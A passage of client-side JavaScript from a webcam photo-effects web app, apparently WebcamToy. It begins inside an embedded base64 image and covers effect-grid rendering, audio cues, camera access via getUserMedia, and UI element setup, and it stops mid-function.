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";
    return e;
};
WebcamToy.Grid = (function (o) {
    "use strict";
    function e(e, A, t, i, r) {
        this.source = A;
        this.page = 0;
        this.itemWidth = t;
        this.itemHeight = i;
        this.gridContext2D = o.Effect.getContext2D(t, i);
        this.effects = new Array(r);
        this.totalPages = Math.ceil(o.Effect.total / this.effects.length);
        for (var s = 0; s < this.effects.length; s++) {
            this.effects[s] = new o.Effect(e[s], this.gridContext2D.canvas, t, i);
        }
    }
    e.prototype.initPages = function (e, A, t) {
        var i = this;
        this.setPage(e, function () {
            if (A) {
                A(e);
            }
            if (e > 0) {
                setTimeout(function () {
                    i.initPages(e - 1, A, t);
                }, 0);
            } else if (t) {
                o.log("Grid complete");
                t();
            }
        });
    };
    e.prototype.draw = function () {
        try {
            this.gridContext2D.drawImage(this.source, 0, 0, this.itemWidth, this.itemHeight);
        } catch (e) {}
        var e = o.Effect.autoEnhance(this.source);
        for (var A = this.effects.length; A--; ) {
            var t = this.effects[A];
            if (!t.fpsGrid) {
                t.mainUniforms.mult = e.mult;
                t.mainUniforms.offset = e.offset;
                t.draw();
            }
            t.fpsGrid++;
            t.fpsGrid %= Math.ceil(30 / t.fps);
        }
    };
    e.prototype.getEffectID = function (e) {
        var A = Math.clamp(Math.floor(e), 0, this.effects.length);
        return this.effects && this.effects[A] ? this.effects[A].id : "";
    };
    e.prototype.setPage = function (e, A) {
        this.page = Math.clamp(Math.floor(e), 0, this.totalPages);
        for (var t = this.effects.length; t--; ) {
            var i = this.effects[t];
            if (i) {
                i.setEffect(i.getEffectID(this.page * this.effects.length + t));
            }
        }
        if (A) {
            A(e);
        }
        o.log("Grid page", e);
    };
    e.prototype.previousPage = function () {
        this.page--;
        if (this.page < 0) {
            this.page = this.totalPages - 1;
        }
        this.setPage(this.page);
    };
    e.prototype.nextPage = function () {
        this.page++;
        this.page %= this.totalPages;
        this.setPage(this.page);
    };
    e.prototype.updateOrientation = function (e) {
        for (var A = this.effects.length; A--; ) {
            this.effects[A].updateOrientation(e);
        }
    };
    e.prototype.useMirror = function (e) {
        for (var A = this.effects.length; A--; ) {
            this.effects[A].useMirror(e);
        }
    };
    e.prototype.useSquare = function (e) {
        for (var A = this.effects.length; A--; ) {
            this.effects[A].useSquare(e);
        }
    };
    e.prototype.destroy = function () {
        for (var e = this.effects.length; e--; ) {
            if (this.effects[e]) {
                this.effects[e].destroy();
                this.effects[e] = null;
            }
        }
        this.effects = [];
        this.gridContext2D = null;
    };
    return e;
})(WebcamToy);
WebcamToy.Audio = (function (r) {
    "use strict";
    var e = {},
        s = {},
        A = ["countdown", "capture"];
    function t(e) {
        var A = new window.Audio(),
            t = r.Services.assetsURL + "audio/" + e,
            i = document.createElement("source");
        i.type = "audio/mpeg";
        i.src = t + ".mp3";
        A.appendChild(i);
        i = document.createElement("source");
        i.type = "audio/ogg";
        i.src = t + ".ogg";
        A.appendChild(i);
        s[e] = A;
    }
    e.playTrack = function (A, e) {
        if (!!window.Audio) {
            setTimeout(function () {
                if (s[A]) {
                    var e = s[A].play();
                    if (e) {
                        e.catch(function () {});
                    }
                }
            }, e || 0);
        }
    };
    e.loadAudio = function () {
        if (!!window.Audio) {
            for (var e = A.length; e--; ) {
                t(A[e]);
            }
        }
    };
    return e;
})(WebcamToy);
WebcamToy.Camera = (function () {
    "use strict";
    var o = {},
        a,
        n,
        c,
        h,
        s;
    o.cameras = [];
    try {
        o.number = localStorage.getItem("camera") || undefined;
    } catch (e) {}
    o.hasGetUserMedia = (function () {
        return !!navigator.getUserMedia || !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia);
    })();
    function u() {
        WebcamToy.log("Infobar shown");
        l();
    }
    function l() {
        $(window).off("resize", u);
        clearTimeout(h);
    }
    function f(e) {
        o.number = undefined;
        l();
        try {
            if (a) {
                if (a.src) {
                    a.src = undefined;
                }
                if (a.srcObject) {
                    a.srcObject = undefined;
                }
                if (a.mozSrcObject) {
                    a.mozSrcObject = undefined;
                }
            }
        } catch (e) {}
        if (n) {
            n(a, "", e || "Error");
        }
    }
    function d(e) {
        l();
        if (typeof e === "object") {
            if (e.name) {
                e = e.name;
            } else if (e.code === 1 || e.PERMISSION_DENIED) {
                e = "PermissionDeniedError";
            } else {
                e = JSON.stringify(e);
            }
        }
        var A;
        switch (e) {
            case "AbortError":
            case "NotAllowedError":
            case "Permission Denied":
            case "PERMISSION_DENIED":
            case "PermissionDeniedError":
            case "PermissionDismissedError":
                A = "Camera access denied";
                break;
            case "DevicesNotFoundError":
            case "NO_DEVICES_FOUND":
            case "NotFoundError":
            case "NotFoundError: The object can not be found here.":
                A = "Camera not found";
                o.number = undefined;
                break;
            case "CONSTRAINT_NOT_SATISFIED":
            case "ConstraintNotSatisfiedError":
            case "Error":
            case "HARDWARE_UNAVAILABLE":
            case "InternalError":
            case "InvalidAccessError":
            case "InvalidSecurityOriginError":
            case "InvalidStateError":
            case "MANDATORY_UNSATISFIED_ERROR":
            case "MediaDeviceFailedDueToShutdown":
            case "MediaDeviceNotSupported":
            case "NOT_SUPPORTED_ERROR":
            case "NotReadableError":
            case "NotSupportedError":
            case "OverconstrainedError":
            case "SecurityError":
            case "SourceUnavailableError":
            case "Starting video failed":
            case "TabCaptureError":
            case "TrackStartError":
                o.number = undefined;
                A = "Camera unavailable";
                break;
        }
        if (c) {
            setTimeout(function () {
                if (A) {
                    c(A, e);
                } else {
                    c(e);
                }
            }, 150);
        } else {
            f(A || e);
        }
    }
    function e() {
        n(a, o.cameras[o.number] && o.cameras[o.number].label);
    }
    o.checkAllowed = function (t) {
        if (o.hasGetUserMedia) {
            var i = o.cameras.length === 0;
            try {
                if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices && window.Promise) {
                    navigator.mediaDevices.enumerateDevices().then(function (e) {
                        var A = false;
                        e.forEach(function (e) {
                            if (e.label && e.kind === "videoinput") {
                                A = true;
                                if (i) {
                                    o.cameras.push({ label: e.label, id: e.deviceId });
                                }
                            }
                        });
                        t(A);
                    });
                } else {
                    t(false);
                }
            } catch (e) {
                t(false);
            }
        } else {
            t(false);
        }
    };
    function m(A) {
        var t = false;
        if (s && s.getTracks) {
            s.getTracks().forEach(function (e) {
                t = true;
                e.stop();
            });
        }
        s = A;
        l();
        try {
            var i = o.cameras.length === 0;
            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices && window.Promise) {
                navigator.mediaDevices.enumerateDevices().then(function (e) {
                    e.forEach(function (e) {
                        if (i && e.kind === "videoinput") {
                            o.cameras.push({ label: e.label, id: e.deviceId });
                        }
                    });
                    if (o.number === undefined && s && s.getVideoTracks) {
                        s.getVideoTracks().forEach(function (e) {
                            for (var A = o.cameras.length; A--; ) {
                                var t = o.cameras[A];
                                if (e.label === t.label) {
                                    o.number = A;
                                    break;
                                }
                            }
                        });
                    }
                    if (o.number === undefined) {
                        o.number = 0;
                    }
                });
            }
        } catch (e) {}
        if (o.number !== undefined) {
            try {
                localStorage.setItem("camera", o.number);
            } catch (e) {}
        }
        if (navigator.mozGetUserMedia) {
            try {
                a.mozSrcObject = A;
                a.srcObject = A;
                a.load();
            } catch (e) {
                f(e || "Video error");
            }
            if (n) {
                setTimeout(e, 150);
            }
        } else {
            $(a).on("ended", function () {
                $(this).off("ended");
                WebcamToy.UI.destroy("Video error");
            });
            $(a).on("canplay", function () {
                $(this).off("canplay");
                clearTimeout(h);
                if (n) {
                    setTimeout(e, 150);
                }
            });
            clearTimeout(h);
            h = setTimeout(function () {
                if (n) {
                    e();
                }
            });
            try {
                if (!a.srcObject || t) {
                    a.srcObject = A;
                    a.loop = a.muted = true;
                    a.load();
                }
            } catch (e) {
                try {
                    var r = window.URL || window.webkitURL;
                    a.src = r ? r.createObjectURL(A) : A;
                    a.loop = a.muted = true;
                    a.load();
                } catch (e) {
                    f(e || "Video error");
                }
            }
        }
    }
    o.getCamera = function (e, A, t) {
        if (!a) {
            a = document.createElement("video");
        }
        if (t === undefined && (a.src || a.srcObject || a.mozSrcObject)) {
            return;
        }
        n = e;
        c = A;
        a.onerror = function (e) {
            a.onerror = null;
            f(e || "Video error");
        };
        var i = WebcamToy.ua.isChrome && WebcamToy.ua.versionChrome < 42;
        if (i) {
            l();
            $(window).resize(u);
        }
        h = setTimeout(
            function () {
                d({ name: "Camera timeout" });
            },
            i ? 7e3 : 15e3
        );
        try {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia && window.Promise) {
                var r = !WebcamToy.ua.isMobile && (WebcamToy.ua.isChrome || WebcamToy.ua.isFirefox);
                var s = { width: { ideal: r ? 960 : 640 }, height: { ideal: r ? 720 : 480 } };
                if (t !== undefined && o.cameras[t]) {
                    s.deviceId = { exact: o.cameras[t].id };
                    o.number = t;
                } else {
                    s.facingMode = "user";
                }
                navigator.mediaDevices.getUserMedia({ audio: false, video: s }).then(m).catch(d);
            } else {
                navigator.getUserMedia({ audio: false, video: true }, m, d);
            }
        } catch (e) {
            try {
                navigator.getUserMedia("video", m, d);
            } catch (e) {
                f("Camera inaccessible");
            }
        }
        WebcamToy.log("getUserMedia");
    };
    return o;
})();
WebcamToy.UI = (function (o) {
    "use strict";
    var A = {},
        a = o.ua.isMobile,
        c = {
            isCapturing: false,
            isSharing: false,
            isGrid: false,
            isGridLoaded: false,
            isZooming: false,
            isDestroyed: false,
            isPhotoSaved: false,
            useCameraFlash: true,
            useCountdown: !a,
            shareService: "",
            saveCount: 1,
            saveFilename: "",
            photoTextNum: 0,
            photoCommentNum: 0,
            postAttempt: 0,
            countdown: 0,
            quadCountdown: 0,
            restoreCount: 0,
        },
        e,
        t = 0,
        h,
        u,
        l,
        n,
        f,
        i,
        r,
        d,
        s,
        m = 280 - 35,
        g = false,
        p = $("#toy"),
        x = $("#toy-intro"),
        C = $("#toy-ui"),
        v = $("#toy-view"),
        b = $("#toy-grid"),
        y = $("#toy-main"),
        w = $("#toy-view canvas"),
        E = $("#grid-ui"),
        S = $("#grid-view canvas"),
        T = $("#grid-view p"),
        R = $("#grid-view>div>div"),
        k = $("#settings form"),
        U = $("#settings .popup"),
        I = $("#setting-mirror"),
        D = $("#setting-square"),
        B = $("#setting-countdown"),
        F = $("#setting-flash"),
        J = $("#setting-full-screen"),
        L = $("#button-settings"),
        K = $("#button-previous"),
        q = $("#button-next"),
        W = $("#button-up"),
        O = $("#button-down"),
        Q = $("#button-effects"),
        M = $("#button-effects .loading"),
        G = $("#button-effects .loading .pc"),
        Z = $("#button-capture"),
        V = $("#button-back"),
        z = $("#button-save"),
        N = $("div.button.twitter"),
        P = $("a.button.twitter"),
        j = $("div.button.google"),
        Y = $("a.button.google"),
        H = $("div.button.tumblr"),
        X = $("a.button.tumblr"),
        _ = $("div.button.vk"),
        ee = $("a.button.vk"),
        Ae = $("div.button.logout"),
        te = $("#capture-text"),
        ie = $("#capture-quad-text"),
        re = $("#toy-countdown"),
        se = $("#prompt-back"),
        oe = $("#prompt-discard"),
        ae = $("#prompt-save"),
        ne = $("#toy-share-ui footer"),
        ce = $("#prompt-login"),
        he = $("#prompt-login span"),
        ue = $("#prompt-twitter-logout"),
        le = $("#prompt-twitter-post"),
        fe = $(".button.twitter .share-posting"),
        de = ue.text(),
        me = le.text(),
        ge = fe.text(),
        pe = $("#prompt-google-logout"),
        xe = $(".button.google .share-posting"),
        Ce = xe.text(),
        ve = $("#prompt-tumblr-logout"),
        be = $(".button.tumblr .share-posting"),
        ye = be.text(),
        we = $("#prompt-vk-logout"),
        Ee = $(".button.vk .share-posting"),
        Se = Ee.text(),
        Te = $("#photo"),
        Re = $("#photo>img"),
        ke = $("#photo form"),
        Ue = $('#photo input[type="text"]'),
        Ie = Ue[0],
        De = Ie && Ue.data("alt").split("|"),
        Be = $("#photo-ad"),
        Fe = $("#photo p"),
        Je = $('#photo input[type="hidden"]');
    function Le(e, A, t, i, r) {
        var s = r ? "fade-fast" : "fade-slow";
        A.show().addClass(s);
        d = setTimeout(function () {
            A.css("opacity", e);
            d = setTimeout(
                function () {
                    A.removeClass(s);
                    if (!e) {
                        A.hide();
                    }
                    if (i) {
                        i();
                    }
                },
                r ? 210 : 410
            );
        }, t || 0);
    }
    function Ke() {
        r = requestAnimationFrame(qe);
    }
    function qe() {
        if (c.isGrid && l) {
            i = setTimeout(Ke, 1e3 / 30);
            l.draw();
        } else if (u) {
            i = setTimeout(Ke, 1e3 / u.fps);
            u.autoEnhance();
            u.draw();
            u.drawBackground();
        }
    }
    function We() {
        $("#button-effects .effect").hide();
        if ($("#button-effects").width() === 50) {
            $("#button-effects .plus").show();
        } else {
            $("#button-effects .effect-" + u.id).show();
        }
    }
    function Oe() {
        u.quadPos = c.quadCountdown = u.isQuad ? 4 : 0;
        if (c.quadCountdown) {
            te.hide();
            ie.show();
            Z.addClass("quad");
        } else {
            ie.hide();
            te.show();
            Z.removeClass("quad");
        }
        try {
            u.draw();
        } catch (e) {}
        k.hide();
        We();
        o.log("Effect", u.id);
    }
    function Qe() {
        if (!w || !h) {
            return;
        }
        var t = it(),
            e = p.width(),
            i = p.height(),
            A = u.isSquare,
            r = Math.ceil;
        if (c.isGrid && S) {
            var s = false,
                o = parseInt(E.css("bottom"), 10) < 26 ? 50 : 75,
                a = Math.floor(e / 3 - 25),
                n = u.isSquare ? a : a / f;
            if (l && l.effects.length === 6) {
                i *= 4 / 3;
            }
            S.stop(true, false).each(function () {
